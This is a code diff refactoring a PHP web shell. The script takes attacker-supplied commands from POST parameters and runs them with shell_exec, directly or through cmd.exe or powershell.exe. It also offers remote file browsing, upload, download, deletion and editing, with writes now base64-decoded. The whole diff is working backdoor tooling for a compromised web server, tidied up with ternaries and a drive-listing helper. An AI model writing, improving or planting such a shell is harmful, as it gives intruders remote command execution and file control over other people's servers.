@@ -7,44 +7,26 @@ function main()
 {
     ob_start();
     login();
-    os();
+    $is_win = os();
 
     if ($_POST['action'] === 'init')
     {
         init();
     }
-    elseif ($_POST['action'] === 'shell' && $is_win == false)
+    elseif ($_POST['action'] === 'power' && !$is_win)
     {
-        if (is_null($_POST['command']) || $_POST['command'] == Null)
-        {
-            echo "0";
-        }
-        else
-        {
-            echo shell_exec($_POST['command']);
-        }
+        echo is_null($_POST['command']) || $_POST['command'] == Null ? "0"
+            : shell_exec($_POST['command']);
     }
-    elseif ($_POST['action'] === 'cmd' && $is_win == true)
+    elseif ($_POST['action'] === 'cmd' && $is_win)
     {
-        if (is_null($_POST['command']) || $_POST['command'] == Null)
-        {
-            echo "0";
-        }
-        else
-        {
-            echo shell_exec('cmd.exe ' . $_POST['command']);
-        }
+        echo is_null($_POST['command']) || $_POST['command'] == Null ? "0"
+            : shell_exec('cmd.exe ' . $_POST['command']);
     }
-    elseif ($_POST['action'] === 'power' && $is_win == true)
+    elseif ($_POST['action'] === 'power' && $is_win)
     {
-        if (is_null($_POST['command']) || $_POST['command'] == Null)
-        {
-            echo "0";
-        }
-        else
-        {
-            echo shell_exec('powershell.exe ' . $_POST['command']);
-        }
+        echo is_null($_POST['command']) || $_POST['command'] == Null ? "0"
+            : shell_exec('powershell.exe ' . $_POST['command']);
     }
     elseif ($_POST['action'] === 'filebrowser')
     {
@@ -89,15 +71,8 @@ function login()
 
 function os()
 {
-    if (php_uname('s') === "Windows")
-    {
-        $is_win = true;
-    }
-    else
-    {
-        $is_win = false;
-    }
-    return $is_win;
+    // constant PHP_OS also might be used
+    return php_uname('s') === "Windows";
 }
 
 function init()
@@ -149,38 +124,34 @@ function filebrowser($path)
         }
         elseif (php_uname('s') === "Windows")
         {
-            $FileSystemObject = new COM('Scripting.FileSystemObject');
-            $Drives =   $FileSystemObject->Drives; 
-            $DriveTypes = array("Unknown","Removable","Fixed","Network","CD-ROM","RAM Disk"); 
-            $SystemDrives = [];
-            foreach($Drives as $Drive )
-            { 
-                if (($Drive->DriveType == 1)||($Drive->DriveType == 2)||($Drive->DriveType == 3))
+            $Drives = get_win_drives();
+            if($Drives) {
+                $DriveTypes = array("Unknown","Removable","Fixed","Network","CD-ROM","RAM Disk");
+                $SystemDrives = [];
+                foreach($Drives as $Drive )
                 {
-                    $SystemDrives[] = $Drive->Path;
-                }   
+                    if (($Drive->DriveType == $DriveTypes[1])
+                        || ($Drive->DriveType == $DriveTypes[2])
+                        || ($Drive->DriveType == $DriveTypes[3]))
+                    {
+                        $SystemDrives[] = $Drive->Path;
+                    }
+                }
             }
         }
 
-        if ($path == Null)
-        {
-            $cwd = getcwd();
-        }
-        else
-        {
-            $cwd = $path;
-        }
+        $cwd = $path == Null ? getcwd() : $path;
         //Drives = array
         // CWD == string
         // ParentDir == string
-        
+
         $main_array = array('Drives' => $SystemDrives, 'CWD' => $cwd, 'ParentDir' => dirname($cwd), 'Directories' => array(), 'Files' => array());
-        
+
         $dirs = glob($cwd . '/*', GLOB_ONLYDIR);
         foreach ($dirs as $dir)
         {
             $main_array['Directories'][] = array(
-                "DirectoryName" => $dir,
+                "DirectoryName" => basename($dir),
                 "Perms" => substr(sprintf('%o', fileperms($dir)), -4),
                 "CreationTime" => filectime($dir),
                 "LastAccess" => fileatime($dir),
@@ -192,7 +163,7 @@ function filebrowser($path)
         foreach ($files as $file)
         {
             $main_array['Files'][] = array(
-                "Filename" => $file,
+                "Filename" => basename($file),
                 "FileSize" => human_filesize(filesize($file)),
                 "FilePerms" => substr(sprintf('%o', fileperms($file)), -4),
                 "CreationTime" => filectime($file),
@@ -208,27 +179,11 @@ function fremove($path)
 {
     if (is_dir($path))
     {
-        if(rmdir($path))
-        {
-            echo '1';
-        }
-        else
-        {
-            echo '0';
-        }
+        echo rmdir($path) ? '1' : '0';
     }
     else
     {
-        if (file_exists($path))
-        {
-            $absolute_path = realpath($path);
-            unlink($absolute_path);
-            echo '1';
-        }
-        else
-        {
-            echo '0';
-        }
+        echo file_exists($path) && unlink(realpath($path)) ? '1' : '0';
     }
 }
 
@@ -247,57 +202,54 @@ function fdownload($path)
 function fupload($path)
 {
     $target_file = $path . basename($_FILES['file']['name']);
-
-    if (file_exists($target_file)) {
-        echo 0;
-    }
-    else {
-        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
-            echo 1;
-        }
-        else {
-            echo 0;
-        }
-    }
+    echo !file_exists($target_file) && move_uploaded_file($_FILES['file']['tmp_name'], $target_file) ? 1 : 0;
 }
 
 function file_editor($path)
 {
+    if (!file_exists($path)) {
+        echo 0;
+        return;
+    }
+
     if ($_POST['method'] === 'read')
     {
-        if (file_exists($path)) {
-            readfile($path);
-        }
-        else {
-            echo 0;
-        }
+        readfile($path);
     }
     elseif ($_POST['method'] === 'write')
     {
-        if (file_exists($path))
-        {
-            file_put_contents($path, $_POST['text']);
-        }
-        else {
-            echo 0;
-        }
+        echo file_put_contents($path, base64_decode($_POST['text'])) ? 1 : 0;
     }
 }
 
-// Will need to test and probably fix since I have no clue if this will work :(
+function get_win_drives() {
+    // The extension is enabled by default in php version < 5.3.15 / 5.4.5 but might be switched off in php.ini
+    if(extension_loaded('COM')) {
+        $FileSystemObject = new COM('Scripting.FileSystemObject');
+        return $FileSystemObject->Drives;
+    }
+
+    // Need to test, we might be able to load the extension if it is installed
+    // https://www.php.net/manual/en/function.dl.php
+
+    return false;
+}
+
 function win_drives()
 {
-    $fso = new COM('Scripting.FileSystemObject');
-    foreach ($fso->Drives as $drive)
-    {
-        json_response(array(
-            'Drive' => $drive->DriveLetter
-        ));
+    $fso = get_win_drives();
+    if($fso) {
+        $drives = [];
+        foreach ($fso as $drive)
+        {
+            $drives['Drive'][] = $drive->DriveLetter;
+        }
+        echo json_response($drives);
     }
 }
 
 // Came from https://gist.github.com/james2doyle/33794328675a6c88edd6
-function json_response($message = null)
+function json_response($message = null, $code = 200)
 {
     header_remove();
     http_response_code($code);
@@ -308,7 +260,7 @@ function json_response($message = null)
         400 => '400 Bad Request',
         422 => 'Unprocessable Entity',
         500 => '500 Internal Server Error'
-        );
+    );
     header('Status: '.$status[$code]);
 
     return json_encode($message);
@@ -320,7 +272,8 @@ function human_filesize($bytes, $decimals = 2)
         return $bytes . ' B';
     }
     $factor = floor(log($bytes, 1024));
-    return sprintf("%.{$decimals}f ", $bytes / pow(1024, $factor)) . ['B', 'KB', 'MB', 'GB', 'TB', 'PB'][$factor];
+    $sizes = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
+    return sprintf("%.{$decimals}f ", $bytes / pow(1024, $factor)) . $sizes[$factor];
 }
 
 main();
